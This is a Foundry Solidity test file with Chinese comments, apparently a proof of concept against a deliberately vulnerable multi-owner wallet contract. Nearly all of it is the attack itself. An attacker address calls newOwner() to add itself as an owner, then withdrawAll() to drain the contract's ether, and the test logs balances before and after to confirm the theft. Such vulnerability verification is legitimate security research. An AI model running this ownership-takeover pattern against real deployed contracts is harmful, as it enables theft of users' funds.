// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/multiowned_vulnerable.sol";

contract MinerOwnershipManipulationTest is Test {
    TestContract target;
    address owner = address(0x123);
    address attacker = address(0x456);

    function setUp() public {
        vm.deal(owner, 10 ether);
        vm.startPrank(owner);
        target = new TestContract();
        // Deposit 5 ether as contract balance
        target.deposit{value: 5 ether}();
        vm.stopPrank();
    }

    function testMinerCanDrainFundsViaOwnership() public {
        // 记录攻击前状态
        console.log("--- BEFORE-Trigger State ---");
        bool isOwnerBefore = (target.owners(attacker) != address(0)); // 修复：检查返回地址是否为非零
        uint256 contractBalanceBefore = address(target).balance;
        uint256 attackerBalanceBefore = attacker.balance;
        console.log("Attacker is owner? Before:", isOwnerBefore);
        console.log("Contract ETH balance Before:", contractBalanceBefore);
        console.log("Attacker ETH balance Before:", attackerBalanceBefore);

        console.log("--- Trigger Attack Actions ---");
        // 开始攻击者交易
        vm.startPrank(attacker);

        // 1. 攻击者将自己添加为owner
        console.log("[Action] Attacker calls newOwner(attacker)");
        target.newOwner(attacker);

        // 2. 攻击者提取全部资金
        console.log("[Action] Attacker calls withdrawAll()");
        target.withdrawAll();
        
        vm.stopPrank();

        // 记录攻击后状态
        console.log("--- AFTER-Trigger State ---");
        bool isOwnerAfter = (target.owners(attacker) != address(0)); // 修复：同样检查地址
        uint256 contractBalanceAfter = address(target).balance;
        uint256 attackerBalanceAfter = attacker.balance;
        console.log("Attacker is owner? After:", isOwnerAfter);
        console.log("Contract ETH balance After:", contractBalanceAfter);
        console.log("Attacker ETH balance After:", attackerBalanceAfter);

        // 漏洞验证：攻击者是否成为owner（之前不是）且盗取资金
        if (!isOwnerBefore && isOwnerAfter) {
            console.log("Vulnerability Exists: Non-owner successfully became owner and drained funds");
        } else {
            console.log("Vulnerability not Exist: Non-owner could not become owner");
        }
    }
}